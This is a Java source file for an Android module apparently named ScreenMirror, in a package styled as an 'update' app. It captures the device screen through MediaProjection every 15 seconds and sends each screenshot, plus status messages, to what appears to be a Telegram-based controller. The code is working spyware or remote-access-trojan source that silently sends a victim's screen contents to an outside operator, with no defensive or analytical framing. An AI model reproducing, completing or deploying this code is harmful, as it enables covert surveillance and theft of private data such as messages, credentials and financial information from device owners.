package com.kasari.update;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenMirror {

    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static int screenWidth;
    private static int screenHeight;
    private static int screenDensity;
    private static boolean isCapturing = false;
    private static Handler handler = new Handler();
    private static Context contextRef;

    public static void setProjectionData(Context context, int resultCode, Intent data) {
        contextRef = context;
        MediaProjectionManager manager = 
            (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            mediaProjection = manager.getMediaProjection(resultCode, data);
        }
    }

    public static void startCapture(Context context) {
        if (isCapturing) {
            TelegramController.sendMessage(context, "📱 Screen capture already running");
            return;
        }
        
        contextRef = context;
        
        if (mediaProjection == null) {
            TelegramController.sendMessage(context, "📱 Screen capture permission not granted. Re-install app.");
            return;
        }
        
        try {
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
            
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, 
                PixelFormat.RGBA_8888, 2);
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "KasariScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);
            
            isCapturing = true;
            
            TelegramController.sendMessage(context, 
                "📱 Screen mirror started\nCapturing every 15 seconds");
            
            handler.postDelayed(captureRunnable, 15000);
            
        } catch (Exception e) {
            e.printStackTrace();
            TelegramController.sendMessage(context, "📱 Screen mirror failed to start");
        }
    }

    private static Runnable captureRunnable = new Runnable() {
        @Override
        public void run() {
            if (isCapturing) {
                captureScreenshot();
                handler.postDelayed(this, 15000);
            }
        }
    };

    private static void captureScreenshot() {
        try {
            if (imageReader == null) return;
            
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * screenWidth;
                
                Bitmap bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride, 
                    screenHeight, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                
                if (rowPadding > 0) {
                    bitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                }
                
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
                byte[] imageBytes = baos.toByteArray();
                
                String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                    Locale.getDefault()).format(new Date());
                
                TelegramController.sendPhoto(contextRef, imageBytes, 
                    "📱 Screen Captured\nTime: " + timestamp);
                
                image.close();
                bitmap.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void stopCapture(Context context) {
        isCapturing = false;
        handler.removeCallbacksAndMessages(null);
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        TelegramController.sendMessage(context, "🛑 Screen mirror stopped");
    }

    public static boolean isCapturing() {
        return isCapturing;
    }
}